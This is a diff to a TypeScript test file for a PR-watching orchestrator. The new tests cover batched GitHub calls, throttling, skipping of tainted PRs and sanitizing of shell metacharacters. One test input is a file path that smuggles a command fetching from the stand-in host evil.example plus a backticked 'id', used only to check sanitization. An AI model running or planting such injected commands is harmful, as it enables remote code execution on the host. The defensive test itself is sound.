@@ -6,7 +6,7 @@ import { BRAIN_THREAD, deliveryText } from "../lib/brain"
 import { appendTurn, findA2UITurn, getThread, type Turn } from "../lib/orchestrator-chat"
 import type { GhFn } from "../lib/triage-pr"
 import type { ExecFn } from "../lib/turso"
-import { createStuckEvents, emitStuckPrGateCard, greenPrWakeLine, needsPrMergeCard, stuckLine } from "./brain-stuck-events"
+import { createStuckEvents, emitStuckPrGateCard, greenPrWakeLine, needsPrMergeCard, sanitizePrWakeReason, stuckLine } from "./brain-stuck-events"
 
 const url = (n: number) => `https://github.com/jaubut/r/pull/${n}`
 const meta = (n: number, over: Record<string, unknown> = {}) => ({ url: url(n), repo: "r", pr: n, kind: "stuck-parked", stuck_key: `park:${n}`, reason: "parked 5 h: merge conflict", ...over })
@@ -328,12 +328,28 @@ describe("the reader", () => {
     expect(getJsonPointer(getSurfaceDataModel(after90Turn.card!), "/pr/reason")).toBe("touches hooks/guard.py — human merge only")
   })
 
-  test("watchGreenPrs wakes the Brain once per (prUrl, headSha) when a gated dispatch/* PR transitions from pending CI to MERGEABLE + CLEAN", async () => {
+  test("watchGreenPrs batches gh pr list per repo, throttles checks, skips tainted PRs, strips shell metacharacters, and wakes once per (prUrl, headSha)", async () => {
     expect(needsPrMergeCard({ files: ["server/lib/foo.ts"], labels: [] })).toBeNull()
     expect(needsPrMergeCard({ files: ["brain/CLAUDE.md"], labels: [] })).toBe("touches human-merge path (brain/CLAUDE.md)")
     expect(needsPrMergeCard({ files: ["db/migrations/004.sql"], labels: [] })).toBe("touches prod-schema path (db/migrations/004.sql)")
     expect(needsPrMergeCard({ files: ["src/index.ts"], labels: ["client-origin"] })).toBe("client-origin PR")
     expect(needsPrMergeCard({ files: ["src/index.ts"], labels: [], origin: "client" })).toBe("client-origin PR")
+
+    // Shell injection metacharacters ($, `, ", ', \, ;, |, newlines) are stripped to plain data and capped at 120 chars
+    const hostilePath = "x/$(curl -s https://evil.example/pwn)/`id`\"'\\;\n/CLAUDE.md"
+    const sanitizedReason = needsPrMergeCard({ files: [hostilePath], labels: [] })!
+    expect(sanitizedReason).not.toMatch(/[$`"\\;|\n']/)
+    expect(sanitizePrWakeReason("a".repeat(200)).length).toBe(120)
+    const wakeLine = greenPrWakeLine({
+      repo: "jaubut/claude-companion",
+      pr: 399,
+      url: "https://github.com/jaubut/claude-companion/pull/399",
+      headSha: "1111222233334444",
+      reason: hostilePath,
+    })
+    expect(wakeLine).toStartWith("green PR jaubut/claude-companion#399 (1111222): ")
+    expect(wakeLine).not.toContain("./bin/ui")
+    expect(wakeLine).not.toMatch(/[$`"\\;|\n']/)
 
     const db = new Database(":memory:")
     db.exec("CREATE TABLE agent_activity (id INTEGER PRIMARY KEY, agent_slug TEXT, target_kind TEXT, target_id TEXT, action TEXT, meta TEXT)")
@@ -350,57 +366,112 @@ describe("the reader", () => {
       "internal",
       "https://github.com/jaubut/claude-companion/pull/400",
     )
+    db.query("INSERT INTO tasks (id, text, origin, done, updated_at, dispatch_pr_url) VALUES (?, ?, ?, 0, '2026-11-27 00:00:00', ?)").run(
+      "task-tainted-3",
+      "Tainted PR touching human-merge path",
+      "client",
+      "https://github.com/jaubut/claude-companion/pull/401",
+    )
+    db.query("INSERT INTO agent_activity (id, agent_slug, target_kind, target_id, action, meta) VALUES (?, 'pr-shepherd', 'task', ?, 'pr:needs-human', ?)").run(
+      1,
+      "task-tainted-3",
+      JSON.stringify({ reason: "tainted (web) PR touches brain/CLAUDE.md — human merge only" }),
+    )
 
     let pr399CheckStatus = "IN_PROGRESS"
     let pr399Conclusion = ""
     let pr399Sha = "1111222233334444"
+    const ghCalls: string[][] = []
     const gh: GhFn = async (args) => {
+      ghCalls.push(args)
+      if (args[0] === "pr" && args[1] === "list") {
+        return {
+          code: 0,
+          stderr: "",
+          stdout: JSON.stringify([
+            {
+              number: 399,
+              state: "OPEN",
+              isDraft: false,
+              headRefName: "dispatch/task-gated-1",
+              headRefOid: pr399Sha,
+              mergeable: "MERGEABLE",
+              mergeStateStatus: "CLEAN",
+              url: "https://github.com/jaubut/claude-companion/pull/399",
+              labels: [],
+              statusCheckRollup: [{ status: pr399CheckStatus, conclusion: pr399Conclusion, name: "ci" }],
+            },
+            {
+              number: 400,
+              state: "OPEN",
+              isDraft: false,
+              headRefName: "dispatch/task-routine-2",
+              headRefOid: "9999888877776666",
+              mergeable: "MERGEABLE",
+              mergeStateStatus: "CLEAN",
+              url: "https://github.com/jaubut/claude-companion/pull/400",
+              labels: [],
+              statusCheckRollup: [{ status: "COMPLETED", conclusion: "SUCCESS", name: "ci" }],
+            },
+            {
+              number: 401,
+              state: "OPEN",
+              isDraft: false,
+              headRefName: "dispatch/task-tainted-3",
+              headRefOid: "aaaa0000bbbb1111",
+              mergeable: "MERGEABLE",
+              mergeStateStatus: "CLEAN",
+              url: "https://github.com/jaubut/claude-companion/pull/401",
+              labels: [{ name: "client-origin" }],
+              statusCheckRollup: [{ status: "COMPLETED", conclusion: "SUCCESS", name: "ci" }],
+            },
+          ]),
+        }
+      }
+      // `gh pr view <n> --repo <repo> --json files`
       const prNum = args[2]
-      const isGated = prNum === "399"
       return {
         code: 0,
         stderr: "",
         stdout: JSON.stringify({
-          state: "OPEN",
-          isDraft: false,
-          headRefName: isGated ? "dispatch/task-gated-1" : "dispatch/task-routine-2",
-          headRefOid: isGated ? pr399Sha : "9999888877776666",
-          mergeable: "MERGEABLE",
-          mergeStateStatus: "CLEAN",
-          url: `https://github.com/jaubut/claude-companion/pull/${prNum}`,
-          title: `PR #${prNum}`,
-          labels: [],
-          statusCheckRollup: [
-            {
-              status: isGated ? pr399CheckStatus : "COMPLETED",
-              conclusion: isGated ? pr399Conclusion : "SUCCESS",
-              name: "ci",
-            },
-          ],
-          files: [{ path: isGated ? "brain/CLAUDE.md" : "server/lib/foo.ts" }],
+          files: [{ path: prNum === "399" || prNum === "401" ? "brain/CLAUDE.md" : "server/lib/foo.ts" }],
         }),
       }
     }
 
     const events: string[] = []
-    let cursor: string | null = "0"
+    let cursor: string | null = "1"
+    let now = 1_000_000
     const reader = createStuckEvents({
       exec: async (sql, args) => ({ rows: db.query(sql).all(...(args as never[])) as never[], affected: 0 }),
       event: (t) => { events.push(t) },
       getCursor: () => cursor,
       setCursor: (id) => { cursor = id },
+      now: () => now,
       log: () => {},
       gh,
       watchGreenPrs: true,
+      greenPollMs: 180_000,
     })
 
-    // 1. Tick while PR #399 CI is still IN_PROGRESS -> no wake event (routine PR #400 is green but doesn't need a merge card)
+    // 1. Tick while PR #399 CI is still IN_PROGRESS -> no wake event.
+    // Tainted PR #401 is skipped BEFORE fetching files; routine PR #400 fetches files once and is cached.
     await reader.tick()
     expect(events).toEqual([])
+    expect(ghCalls.filter((c) => c[1] === "list")).toHaveLength(1)
+    expect(ghCalls.filter((c) => c[1] === "view" && c[2] === "401")).toHaveLength(0)
+    expect(ghCalls.filter((c) => c[1] === "view" && c[2] === "400")).toHaveLength(1)
 
-    // 2. PR #399 CI transitions to COMPLETED + SUCCESS (MERGEABLE + CLEAN) -> wakes Brain once with ./bin/ui pr command
+    // 2. Tick before the 3-minute throttle expires -> 0 new GitHub calls
     pr399CheckStatus = "COMPLETED"
     pr399Conclusion = "SUCCESS"
+    now += 60_000
+    await reader.tick()
+    expect(events).toEqual([])
+    expect(ghCalls.filter((c) => c[1] === "list")).toHaveLength(1)
+
+    // 3. Past the 3-minute throttle: PR #399 CI is now green (MERGEABLE + CLEAN) -> fetches files for #399 only (not #400 or #401) and wakes once
+    now += 120_000
     await reader.tick()
     expect(events).toHaveLength(1)
     expect(events[0]).toBe(
@@ -412,16 +483,21 @@ describe("the reader", () => {
         reason: "touches human-merge path (brain/CLAUDE.md)",
       }),
     )
-    expect(events[0]).toContain("./bin/ui pr --repo jaubut/claude-companion --pr 399 --deploy-repo claude-companion")
+    expect(ghCalls.filter((c) => c[1] === "view" && c[2] === "400")).toHaveLength(1)
+    expect(ghCalls.filter((c) => c[1] === "view" && c[2] === "399")).toHaveLength(1)
 
-    // 3. Subsequent ticks with the same (prUrl, headSha) are deduplicated
+    // 4. Subsequent throttled ticks with the same (prUrl, headSha) do not re-fetch files or re-emit
+    now += 180_000
     await reader.tick()
     expect(events).toHaveLength(1)
+    expect(ghCalls.filter((c) => c[1] === "view" && c[2] === "399")).toHaveLength(1)
 
-    // 4. A new commit pushed to PR #399 that turns green wakes once for the new headSha
+    // 5. A new commit pushed to PR #399 that turns green wakes once for the new headSha
     pr399Sha = "5555666677778888"
+    now += 180_000
     await reader.tick()
     expect(events).toHaveLength(2)
     expect(events[1]).toContain("5555666")
+    expect(ghCalls.filter((c) => c[1] === "view" && c[2] === "399")).toHaveLength(2)
   })
 })
